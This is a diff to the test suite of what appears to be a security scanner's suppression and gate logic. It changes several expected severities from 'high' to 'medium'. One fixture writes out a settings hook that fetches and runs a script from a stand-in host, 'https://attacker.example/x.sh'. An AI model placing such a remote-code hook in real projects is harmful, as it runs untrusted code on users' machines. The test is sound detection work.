@@ -90,7 +90,7 @@ describe('THE RULE: a suppression added in the same change does not apply', () =
     const d = diffScans(base, head);
     expect(d.escalated).toHaveLength(1);
     expect(d.escalated[0].finding.suppressed).toBeUndefined();
-    expect(d.worstIntroduced).toBe('high');
+    expect(d.worstIntroduced).toBe('medium'); // same severity, worse form (fw#481 S1)
   });
 
   it('an untrustworthy base honours NO suppression in the gate (degrades strict, never opens)', () => {
@@ -290,8 +290,8 @@ describe('H — the honour rule: same finding, in the base, no worse, same evide
     const d = diffScans(base, head);
     expect(d.escalated).toHaveLength(1);
     expect(d.escalated[0].finding.suppressed).toBeUndefined();
-    expect(d.worstIntroduced).toBe('high');
-    expect(d.worstAll).toBe('high');
+    expect(d.worstIntroduced).toBe('medium');
+    expect(d.worstAll).toBe('medium');
     expect(d.escalated[0].finding.signals.join(' ')).toMatch(/accepted at medium/);
   });
 
@@ -322,7 +322,7 @@ describe('H — the honour rule: same finding, in the base, no worse, same evide
     // The command is this rule's locator, so a new command is a new finding; either way the
     // suppression does not carry over and the gate stays shut.
     expect(f?.signals.join(' ')).toMatch(/evidence changed|this finding is new/);
-    expect(d.worstAll).toBe('high');
+    expect(d.worstAll).toBe('medium');
   });
 
   it('H.3 evidence branch: same file-level finding, same severity, different evidence', () => {
@@ -348,7 +348,7 @@ describe('H — the honour rule: same finding, in the base, no worse, same evide
       { path: SETTINGS, content: remoteHook('https://attacker.example/x.sh') },
       suppress([{ rule: 'CI-1.hook-remote-code', file: SETTINGS, reason: 'same as before' }]),
     ]);
-    expect(diffScans(base, head).worstAll).toBe('high');
+    expect(diffScans(base, head).worstAll).toBe('medium');
   });
 
   it('H.4: a locator-less base entry does not cover a NEW finding of that rule', () => {
@@ -367,7 +367,7 @@ describe('H — the honour rule: same finding, in the base, no worse, same evide
     const d = diffScans(base, head);
     const added = d.added.find((f) => /attacker/.test(f.locator ?? ''));
     expect(added?.suppressed).toBeUndefined();
-    expect(d.worstAll).toBe('high');
+    expect(d.worstAll).toBe('medium');
     // …while the pre-existing pinned hook stays accepted.
     expect(d.honoured.find((f) => /guard@1\.2\.3/.test(f.locator ?? ''))?.suppressed).toBeTruthy();
   });
